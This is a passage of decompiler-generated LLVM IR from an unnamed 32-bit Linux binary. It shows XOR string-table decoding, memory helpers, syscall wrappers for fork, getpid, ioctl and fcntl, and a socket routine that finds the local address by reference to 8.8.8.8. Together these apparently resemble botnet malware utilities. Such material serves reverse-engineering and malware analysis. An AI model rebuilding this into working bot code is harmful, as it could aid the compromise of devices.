  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_80509f9 = zext i8 %tmp to i32
  %v1_80509fd = mul nuw nsw i32 %v4_80509f9, 8
  %v2_80509fd = add i32 %v1_80509fd, ptrtoint (i32* @global_var_8055740.28 to i32)
  store i32 %v2_80509fd, i32* %ecx.global-to-local, align 4
  %v0_8050a04 = load i16, i16* @global_var_80555d8.29, align 2
  %v1_8050a04 = sext i16 %v0_8050a04 to i32
  %v1_8050a09 = add i32 %v1_80509fd, add (i32 ptrtoint (i32* @global_var_8055740.28 to i32), i32 4)
  %v2_8050a09 = inttoptr i32 %v1_8050a09 to i16*
  %v3_8050a09 = load i16, i16* %v2_8050a09, align 4
  %v4_8050a09 = icmp eq i16 %v3_8050a09, 0
  br i1 %v4_8050a09, label %dec_label_pc_8050a5a, label %dec_label_pc_8050a10

dec_label_pc_8050a10:                             ; preds = %dec_label_pc_80509f0
  store i32 %v1_8050a04, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8050a18 = udiv i32 %v1_8050a04, 16777216
  %v2_8050a1b = udiv i32 %v1_8050a04, 256
  store i32 %v2_8050a1b, i32* %edi.global-to-local, align 4
  %v5_8050a1e = trunc i32 %v2_8050a18 to i8
  store i8 %v5_8050a1e, i8* %stack_var_-44, align 1
  %v2_8050a21 = udiv i32 %v1_8050a04, 65536
  store i32 %v2_8050a21, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050a24

dec_label_pc_8050a24:                             ; preds = %dec_label_pc_8050a24.dec_label_pc_8050a24_crit_edge, %dec_label_pc_8050a10
  %v0_8050a2a = phi i32 [ %v0_8050a2a.pre, %dec_label_pc_8050a24.dec_label_pc_8050a24_crit_edge ], [ %v1_8050a04, %dec_label_pc_8050a10 ]
  %v0_8050a26 = phi i32 [ %v1_8050a56, %dec_label_pc_8050a24.dec_label_pc_8050a24_crit_edge ], [ 0, %dec_label_pc_8050a10 ]
  %v0_8050a24 = phi i32 [ %v0_8050a4e, %dec_label_pc_8050a24.dec_label_pc_8050a24_crit_edge ], [ %v2_80509fd, %dec_label_pc_8050a10 ]
  %v1_8050a24 = inttoptr i32 %v0_8050a24 to i32*
  %v2_8050a24 = load i32, i32* %v1_8050a24, align 4
  %v2_8050a28 = add i32 %v2_8050a24, %v0_8050a26
  %v1_8050a2c = inttoptr i32 %v2_8050a28 to i8*
  %v2_8050a2c = load i8, i8* %v1_8050a2c, align 1
  %v4_8050a2c = trunc i32 %v0_8050a2a to i8
  %v5_8050a2c = xor i8 %v2_8050a2c, %v4_8050a2c
  store i8 %v5_8050a2c, i8* %v1_8050a2c, align 1
  %v0_8050a2e = load i32, i32* %edx.global-to-local, align 4
  %v0_8050a30 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050a30 = inttoptr i32 %v0_8050a30 to i32*
  %v2_8050a30 = load i32, i32* %v1_8050a30, align 4
  %v2_8050a32 = add i32 %v2_8050a30, %v0_8050a2e
  %v0_8050a34 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050a36 = inttoptr i32 %v2_8050a32 to i8*
  %v2_8050a36 = load i8, i8* %v1_8050a36, align 1
  %v4_8050a36 = trunc i32 %v0_8050a34 to i8
  %v5_8050a36 = xor i8 %v2_8050a36, %v4_8050a36
  store i8 %v5_8050a36, i8* %v1_8050a36, align 1
  %v0_8050a38 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050a3a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050a3a = inttoptr i32 %v0_8050a3a to i32*
  %v2_8050a3a = load i32, i32* %v1_8050a3a, align 4
  %v2_8050a3c = add i32 %v2_8050a3a, %v0_8050a38
  %v0_8050a3e = load i32, i32* %esi.global-to-local, align 4
  %v1_8050a40 = inttoptr i32 %v2_8050a3c to i8*
  %v2_8050a40 = load i8, i8* %v1_8050a40, align 1
  %v4_8050a40 = trunc i32 %v0_8050a3e to i8
  %v5_8050a40 = xor i8 %v2_8050a40, %v4_8050a40
  store i8 %v5_8050a40, i8* %v1_8050a40, align 1
  %v0_8050a42 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050a44 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050a44 = inttoptr i32 %v0_8050a44 to i32*
  %v2_8050a44 = load i32, i32* %v1_8050a44, align 4
  %v1_8050a46 = add i32 %v0_8050a42, 1
  store i32 %v1_8050a46, i32* %edx.global-to-local, align 4
  %v2_8050a47 = add i32 %v2_8050a44, %v0_8050a42
  %v2_8050a49 = load i8, i8* %stack_var_-44, align 1
  %v1_8050a4c = inttoptr i32 %v2_8050a47 to i8*
  %v2_8050a4c = load i8, i8* %v1_8050a4c, align 1
  %v5_8050a4c = xor i8 %v2_8050a4c, %v2_8050a49
  store i8 %v5_8050a4c, i8* %v1_8050a4c, align 1
  %v0_8050a4e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050a4e = add i32 %v0_8050a4e, 4
  %v2_8050a4e = inttoptr i32 %v1_8050a4e to i32*
  %v3_8050a4e = load i32, i32* %v2_8050a4e, align 4
  %v1_8050a51 = urem i32 %v3_8050a4e, 65536
  %v1_8050a56 = load i32, i32* %edx.global-to-local, align 4
  %v8_8050a58 = icmp sgt i32 %v1_8050a51, %v1_8050a56
  br i1 %v8_8050a58, label %dec_label_pc_8050a24.dec_label_pc_8050a24_crit_edge, label %dec_label_pc_8050a5a

dec_label_pc_8050a24.dec_label_pc_8050a24_crit_edge: ; preds = %dec_label_pc_8050a24
  %v0_8050a2a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050a24

dec_label_pc_8050a5a:                             ; preds = %dec_label_pc_8050a24, %dec_label_pc_80509f0
  %v0_8050a61 = phi i32 [ %v1_8050a04, %dec_label_pc_80509f0 ], [ %v1_8050a51, %dec_label_pc_8050a24 ]
  ret i32 %v0_8050a61

; uselistorder directives
  uselistorder i32 %v1_8050a56, { 1, 0 }
  uselistorder i32 %v1_8050a51, { 1, 0 }
  uselistorder i32 %v0_8050a4e, { 1, 0 }
  uselistorder i32 %v1_8050a04, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8055740.28 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_80555d8.29, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8055740.28 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8050fc0(i8* %arg1) local_unnamed_addr {
dec_label_pc_8050fc0:
  %v4_8050fc0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050fc0, i32* @edx, align 4
  %v2_8050fc6 = load i8, i8* %arg1, align 1
  %v3_8050fc6 = icmp eq i8 %v2_8050fc6, 0
  br i1 %v3_8050fc6, label %dec_label_pc_8050fd7, label %dec_label_pc_8050fd0

dec_label_pc_8050fd0:                             ; preds = %dec_label_pc_8050fc0, %dec_label_pc_8050fd0
  %v0_8050fd0 = phi i32 [ %v1_8050fd0, %dec_label_pc_8050fd0 ], [ 0, %dec_label_pc_8050fc0 ]
  %v1_8050fd0 = add i32 %v0_8050fd0, 1
  %v2_8050fd1 = add i32 %v1_8050fd0, %v4_8050fc0
  %v3_8050fd1 = inttoptr i32 %v2_8050fd1 to i8*
  %v4_8050fd1 = load i8, i8* %v3_8050fd1, align 1
  %v5_8050fd1 = icmp eq i8 %v4_8050fd1, 0
  %v1_8050fd5 = icmp eq i1 %v5_8050fd1, false
  br i1 %v1_8050fd5, label %dec_label_pc_8050fd0, label %dec_label_pc_8050fd7

dec_label_pc_8050fd7:                             ; preds = %dec_label_pc_8050fd0, %dec_label_pc_8050fc0
  %v0_8050fd7 = phi i32 [ 0, %dec_label_pc_8050fc0 ], [ %v1_8050fd0, %dec_label_pc_8050fd0 ]
  ret i32 %v0_8050fd7

; uselistorder directives
  uselistorder label %dec_label_pc_8050fd0, { 1, 0 }
}

define i32 @function_8051050(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051050:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8051058 = icmp eq i32 %arg2, 0
  br i1 %v1_8051058, label %dec_label_pc_8051050.dec_label_pc_8051069_crit_edge, label %dec_label_pc_805105c

dec_label_pc_8051050.dec_label_pc_8051069_crit_edge: ; preds = %dec_label_pc_8051050
  %v0_8051069.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051069

dec_label_pc_805105c:                             ; preds = %dec_label_pc_8051050
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_80510605 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_80510605, align 1
  %v0_80510646 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510647 = add i32 %v0_80510646, 1
  store i32 %v1_80510647, i32* %eax.global-to-local, align 4
  %v12_80510658 = icmp eq i32 %v1_80510647, %arg2
  %v1_80510679 = icmp eq i1 %v12_80510658, false
  br i1 %v1_80510679, label %dec_label_pc_8051060.dec_label_pc_8051060_crit_edge, label %dec_label_pc_8051069

dec_label_pc_8051060.dec_label_pc_8051060_crit_edge: ; preds = %dec_label_pc_805105c, %dec_label_pc_8051060.dec_label_pc_8051060_crit_edge
  %v1_805106410 = phi i32 [ %v1_8051064, %dec_label_pc_8051060.dec_label_pc_8051060_crit_edge ], [ %v1_80510647, %dec_label_pc_805105c ]
  %v1_8051060.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051060 = add i32 %v1_805106410, %v1_8051060.pre
  %v3_8051060 = inttoptr i32 %v2_8051060 to i8*
  store i8 0, i8* %v3_8051060, align 1
  %v0_8051064 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051064 = add i32 %v0_8051064, 1
  store i32 %v1_8051064, i32* %eax.global-to-local, align 4
  %v12_8051065 = icmp eq i32 %v1_8051064, %arg2
  %v1_8051067 = icmp eq i1 %v12_8051065, false
  br i1 %v1_8051067, label %dec_label_pc_8051060.dec_label_pc_8051060_crit_edge, label %dec_label_pc_8051069

dec_label_pc_8051069:                             ; preds = %dec_label_pc_805105c, %dec_label_pc_8051060.dec_label_pc_8051060_crit_edge, %dec_label_pc_8051050.dec_label_pc_8051069_crit_edge
  %v0_8051069 = phi i32 [ %v0_8051069.pre, %dec_label_pc_8051050.dec_label_pc_8051069_crit_edge ], [ %v1_80510647, %dec_label_pc_805105c ], [ %v1_8051064, %dec_label_pc_8051060.dec_label_pc_8051060_crit_edge ]
  ret i32 %v0_8051069

; uselistorder directives
  uselistorder i32 %v1_8051064, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051069, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051060.dec_label_pc_8051060_crit_edge, { 1, 0 }
}

define i32 @function_8051070() local_unnamed_addr {
dec_label_pc_8051070:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v7_8051085 = icmp sgt i32 %tmp9, %tmp10
  %tmp17 = icmp slt i32 %tmp10, 1
  %or.cond = or i1 %v7_8051085, %tmp17
  br i1 %or.cond, label %dec_label_pc_805108a, label %dec_label_pc_8051094

dec_label_pc_805108a:                             ; preds = %dec_label_pc_80510a2, %dec_label_pc_80510b5, %dec_label_pc_8051070
  %storemerge = phi i32 [ -1, %dec_label_pc_8051070 ], [ -1, %dec_label_pc_80510a2 ], [ %v0_80510a3, %dec_label_pc_80510b5 ]
  ret i32 %storemerge

dec_label_pc_8051094:                             ; preds = %dec_label_pc_8051070
  %v2_80510ac = add i32 %tmp, -1
  br label %dec_label_pc_80510a8

dec_label_pc_80510a0:                             ; preds = %dec_label_pc_80510a8
  br label %dec_label_pc_80510a2

dec_label_pc_80510a2:                             ; preds = %dec_label_pc_80510b5, %dec_label_pc_80510a0
  %v2_80510b03 = phi i32 [ %v1_80510b5, %dec_label_pc_80510b5 ], [ 0, %dec_label_pc_80510a0 ]
  %v1_80510a2 = add i32 %v0_80510a2, 1
  %v1_80510a3 = add i32 %v0_80510a3, 1
  %v12_80510a4 = icmp eq i32 %tmp10, %v1_80510a2
  br i1 %v12_80510a4, label %dec_label_pc_805108a, label %dec_label_pc_80510a8

dec_label_pc_80510a8:                             ; preds = %dec_label_pc_80510a2, %dec_label_pc_8051094
  %v0_80510a2 = phi i32 [ %v1_80510a2, %dec_label_pc_80510a2 ], [ 0, %dec_label_pc_8051094 ]
  %v0_80510b5 = phi i32 [ %v2_80510b03, %dec_label_pc_80510a2 ], [ 0, %dec_label_pc_8051094 ]
  %v0_80510a3 = phi i32 [ %v1_80510a3, %dec_label_pc_80510a2 ], [ 1, %dec_label_pc_8051094 ]
  %v3_80510ac = add i32 %v2_80510ac, %v0_80510a3
  %v4_80510ac = inttoptr i32 %v3_80510ac to i8*
  %v5_80510ac = load i8, i8* %v4_80510ac, align 1
  %v4_80510b0 = add i32 %v0_80510b5, %tmp8
  %v5_80510b0 = inttoptr i32 %v4_80510b0 to i8*
  %v6_80510b0 = load i8, i8* %v5_80510b0, align 1
  %v17_80510b0 = icmp eq i8 %v5_80510ac, %v6_80510b0
  %v1_80510b3 = icmp eq i1 %v17_80510b0, false
  br i1 %v1_80510b3, label %dec_label_pc_80510a0, label %dec_label_pc_80510b5

dec_label_pc_80510b5:                             ; preds = %dec_label_pc_80510a8
  %v1_80510b5 = add i32 %v0_80510b5, 1
  %v12_80510b6 = icmp eq i32 %tmp9, %v1_80510b5
  %v1_80510b8 = icmp eq i1 %v12_80510b6, false
  br i1 %v1_80510b8, label %dec_label_pc_80510a2, label %dec_label_pc_805108a

; uselistorder directives
  uselistorder i32 %v0_80510a3, { 2, 0, 1 }
  uselistorder i32 %v0_80510b5, { 1, 0 }
  uselistorder i32 %v1_80510a2, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805108a, { 1, 0, 2 }
}

define i32 @function_8051230() local_unnamed_addr {
dec_label_pc_8051230:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_805123d = call i32 @function_8051a1b(i32 16)
  %v1_8051242 = inttoptr i32 %v1_805123d to i32*
  store i32 0, i32* %v1_8051242, align 4
  %v4_805124f = call i32 @function_8051cc7(i32 2, i32 2, i32 0, i32 %v1_805123d)
  store i32 %v4_805124f, i32* %esi.global-to-local, align 4
  %v10_805125b = icmp eq i32 %v4_805124f, -1
  br i1 %v10_805125b, label %dec_label_pc_80512a2, label %dec_label_pc_8051260

dec_label_pc_8051260:                             ; preds = %dec_label_pc_8051230
  %v2_8051260 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051260, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_805127f = call i32 @function_8051aec(i32 %v4_805124f, i32 %v2_8051260, i32 16)
  %v2_8051287 = ptrtoint i32* %stack_var_-12 to i32
  %v0_805128d = load i32, i32* %esi.global-to-local, align 4
  %v3_805128e = call i32 @function_8051b17(i32 %v0_805128d, i32 %v2_8051260, i32 %v2_8051287)
  %v1_8051296 = call i32 @function_80514e3(i32 %v0_805128d)
  br label %dec_label_pc_80512a2

dec_label_pc_80512a2:                             ; preds = %dec_label_pc_8051230, %dec_label_pc_8051260
  %v0_80512a7 = phi i32 [ 0, %dec_label_pc_8051230 ], [ 134744072, %dec_label_pc_8051260 ]
  ret i32 %v0_80512a7

; uselistorder directives
  uselistorder i32 %v4_805124f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8051aec, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8051cc7, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80512a2, { 1, 0 }
}

define i32 @function_805144d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805144d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805144d = load i32, i32* @edi, align 4
  %v0_805144e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8051462 = add i32 %arg2, -12
  %v6_805146c = icmp ugt i32 %v1_8051462, 2
  br i1 %v6_805146c, label %dec_label_pc_805147c, label %dec_label_pc_805146e

dec_label_pc_805146e:                             ; preds = %dec_label_pc_805144d
  %v4_8051472 = call i32 @function_80514a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8051462)
  br label %dec_label_pc_805149e

dec_label_pc_805147c:                             ; preds = %dec_label_pc_805144d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051484 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8051484, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_8051484, -4095
  br i1 %tmp17, label %dec_label_pc_805149c, label %dec_label_pc_8051490

dec_label_pc_8051490:                             ; preds = %dec_label_pc_805147c
  %v1_8051490 = call i32 @function_8051a1b(i32 %v0_805144e)
  %v0_8051495 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051495 = sub i32 0, %v0_8051495
  %v2_8051497 = inttoptr i32 %v1_8051490 to i32*
  store i32 %v1_8051495, i32* %v2_8051497, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805149c

dec_label_pc_805149c:                             ; preds = %dec_label_pc_805147c, %dec_label_pc_8051490
  %v0_805149c = phi i32 [ %v2_8051484, %dec_label_pc_805147c ], [ -1, %dec_label_pc_8051490 ]
  br label %dec_label_pc_805149e

dec_label_pc_805149e:                             ; preds = %dec_label_pc_805146e, %dec_label_pc_805149c
  %v0_80514a3 = phi i32 [ %v4_8051472, %dec_label_pc_805146e ], [ %v0_805149c, %dec_label_pc_805149c ]
  store i32 %v0_805144e, i32* @ebx, align 4
  store i32 %v0_805144d, i32* @edi, align 4
  ret i32 %v0_80514a3

; uselistorder directives
  uselistorder i32 %v2_8051484, { 1, 0, 2 }
  uselistorder i32 %v0_805144e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805149e, { 1, 0 }
  uselistorder label %dec_label_pc_805149c, { 1, 0 }
}

define i32 @function_80514a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80514a4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80514a4 = load i32, i32* @edi, align 4
  store i32 %v0_80514a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80514bc = load i32, i32* @ebx, align 4
  %v1_80514c4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_80514c4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_80514c4, -4095
  br i1 %tmp12, label %dec_label_pc_80514dc, label %dec_label_pc_80514d0

dec_label_pc_80514d0:                             ; preds = %dec_label_pc_80514a4
  %v1_80514d0 = call i32 @function_8051a1b(i32 %v0_80514bc)
  %v0_80514d5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80514d5 = sub i32 0, %v0_80514d5
  %v2_80514d7 = inttoptr i32 %v1_80514d0 to i32*
  store i32 %v1_80514d5, i32* %v2_80514d7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80514e1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80514dc

dec_label_pc_80514dc:                             ; preds = %dec_label_pc_80514a4, %dec_label_pc_80514d0
  %v2_80514e1 = phi i32 [ %v0_80514a4, %dec_label_pc_80514a4 ], [ %v2_80514e1.pre, %dec_label_pc_80514d0 ]
  %v0_80514dc = phi i32 [ %v1_80514c4, %dec_label_pc_80514a4 ], [ -1, %dec_label_pc_80514d0 ]
  store i32 %v2_80514e1, i32* %edi.global-to-local, align 4
  ret i32 %v0_80514dc

; uselistorder directives
  uselistorder i32 %v1_80514c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80514dc, { 1, 0 }
}

define i32 @function_80514e3(i32 %arg1) local_unnamed_addr {
dec_label_pc_80514e3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80514e3 = load i32, i32* @edi, align 4
  store i32 %v0_80514e3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80514eb = load i32, i32* @ebx, align 4
  %v1_80514f3 = call i32 @close(i32 %arg1)
  store i32 %v0_80514eb, i32* @ebx, align 4
  store i32 %v1_80514f3, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80514f3, -4095
  br i1 %tmp9, label %dec_label_pc_805150b, label %dec_label_pc_80514ff

dec_label_pc_80514ff:                             ; preds = %dec_label_pc_80514e3
  %v1_80514ff = call i32 @function_8051a1b(i32 %v0_80514eb)
  %v0_8051504 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051504 = sub i32 0, %v0_8051504
  %v2_8051506 = inttoptr i32 %v1_80514ff to i32*
  store i32 %v1_8051504, i32* %v2_8051506, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805150f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805150b

dec_label_pc_805150b:                             ; preds = %dec_label_pc_80514e3, %dec_label_pc_80514ff
  %v2_805150f = phi i32 [ %v0_80514e3, %dec_label_pc_80514e3 ], [ %v2_805150f.pre, %dec_label_pc_80514ff ]
  %v0_805150b = phi i32 [ %v1_80514f3, %dec_label_pc_80514e3 ], [ -1, %dec_label_pc_80514ff ]
  store i32 %v2_805150f, i32* @edi, align 4
  ret i32 %v0_805150b

; uselistorder directives
  uselistorder i32 %v1_80514f3, { 1, 0, 2 }
  uselistorder i32 %v0_80514eb, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805150b, { 1, 0 }
}

define i32 @function_8051511() local_unnamed_addr {
dec_label_pc_8051511:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051511 = load i32, i32* @ebx, align 4
  store i32 %v0_8051511, i32* %stack_var_-4, align 4
  %v1_805151a = call i32 @fork(i32 %v0_8051511)
  store i32 %v1_805151a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805151a, -4095
  br i1 %tmp7, label %dec_label_pc_8051531, label %dec_label_pc_8051525

dec_label_pc_8051525:                             ; preds = %dec_label_pc_8051511
  %v1_8051525 = call i32 @function_8051a1b(i32 %v0_8051511)
  %v0_805152a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805152a = sub i32 0, %v0_805152a
  %v2_805152c = inttoptr i32 %v1_8051525 to i32*
  store i32 %v1_805152a, i32* %v2_805152c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051535.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051531

dec_label_pc_8051531:                             ; preds = %dec_label_pc_8051511, %dec_label_pc_8051525
  %v2_8051535 = phi i32 [ %v0_8051511, %dec_label_pc_8051511 ], [ %v2_8051535.pre, %dec_label_pc_8051525 ]
  %v0_8051531 = phi i32 [ %v1_805151a, %dec_label_pc_8051511 ], [ -1, %dec_label_pc_8051525 ]
  store i32 %v2_8051535, i32* @ebx, align 4
  ret i32 %v0_8051531

; uselistorder directives
  uselistorder i32 %v1_805151a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051531, { 1, 0 }
}

define i32 @function_8051537() local_unnamed_addr {
dec_label_pc_8051537:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051537 = load i32, i32* @ebx, align 4
  store i32 %v0_8051537, i32* %stack_var_-4, align 4
  %v1_8051540 = call i32 @getpid(i32 %v0_8051537)
  store i32 %v1_8051540, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051540, -4095
  br i1 %tmp7, label %dec_label_pc_8051557, label %dec_label_pc_805154b

dec_label_pc_805154b:                             ; preds = %dec_label_pc_8051537
  %v1_805154b = call i32 @function_8051a1b(i32 %v0_8051537)
  %v0_8051550 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051550 = sub i32 0, %v0_8051550
  %v2_8051552 = inttoptr i32 %v1_805154b to i32*
  store i32 %v1_8051550, i32* %v2_8051552, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805155b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051557

dec_label_pc_8051557:                             ; preds = %dec_label_pc_8051537, %dec_label_pc_805154b
  %v2_805155b = phi i32 [ %v0_8051537, %dec_label_pc_8051537 ], [ %v2_805155b.pre, %dec_label_pc_805154b ]
  %v0_8051557 = phi i32 [ %v1_8051540, %dec_label_pc_8051537 ], [ -1, %dec_label_pc_805154b ]
  %v2_8051559 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051559, i32* @edx, align 4
  store i32 %v2_805155b, i32* @ebx, align 4
  ret i32 %v0_8051557

; uselistorder directives
  uselistorder i32 %v1_8051540, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051557, { 1, 0 }
}

define i32 @function_805155d() local_unnamed_addr {
dec_label_pc_805155d:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805155d = load i32, i32* @ebx, align 4
  store i32 %v0_805155d, i32* %stack_var_-4, align 4
  %v1_8051566 = call i32 @getppid(i32 %v0_805155d)
  store i32 %v1_8051566, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8051566, -4095
  br i1 %tmp7, label %dec_label_pc_805157d, label %dec_label_pc_8051571

dec_label_pc_8051571:                             ; preds = %dec_label_pc_805155d
  %v1_8051571 = call i32 @function_8051a1b(i32 %v0_805155d)
  %v0_8051576 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051576 = sub i32 0, %v0_8051576
  %v2_8051578 = inttoptr i32 %v1_8051571 to i32*
  store i32 %v1_8051576, i32* %v2_8051578, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051581.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805157d

dec_label_pc_805157d:                             ; preds = %dec_label_pc_805155d, %dec_label_pc_8051571
  %v2_8051581 = phi i32 [ %v0_805155d, %dec_label_pc_805155d ], [ %v2_8051581.pre, %dec_label_pc_8051571 ]
  %v0_805157d = phi i32 [ %v1_8051566, %dec_label_pc_805155d ], [ -1, %dec_label_pc_8051571 ]
  store i32 %v2_8051581, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805157d

; uselistorder directives
  uselistorder i32 %v1_8051566, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805157d, { 1, 0 }
}

define i32 @function_8051583(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051583:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051583 = load i32, i32* @edi, align 4
  store i32 %v0_8051583, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805159b = load i32, i32* @ebx, align 4
  %v2_80515a3 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_80515a3, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_80515a3, -4095
  br i1 %tmp12, label %dec_label_pc_80515bb, label %dec_label_pc_80515af

dec_label_pc_80515af:                             ; preds = %dec_label_pc_8051583
  %v1_80515af = call i32 @function_8051a1b(i32 %v0_805159b)
  %v0_80515b4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80515b4 = sub i32 0, %v0_80515b4
  %v2_80515b6 = inttoptr i32 %v1_80515af to i32*
  store i32 %v1_80515b4, i32* %v2_80515b6, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80515c0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80515bb

dec_label_pc_80515bb:                             ; preds = %dec_label_pc_8051583, %dec_label_pc_80515af
  %v2_80515c0 = phi i32 [ %v0_8051583, %dec_label_pc_8051583 ], [ %v2_80515c0.pre, %dec_label_pc_80515af ]
  %v0_80515bb = phi i32 [ %v2_80515a3, %dec_label_pc_8051583 ], [ -1, %dec_label_pc_80515af ]
  store i32 %v2_80515c0, i32* %edi.global-to-local, align 4
  ret i32 %v0_80515bb

; uselistorder directives
  uselistorder i32 %v2_80515a3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80515bb, { 1, 0 }
}

define i32 @function_80515c2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80515c2:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80515c2 = load i32, i32* @ebx, align 4
  store i32 %v0_80515c2, i32* %stack_var_-4, align 4
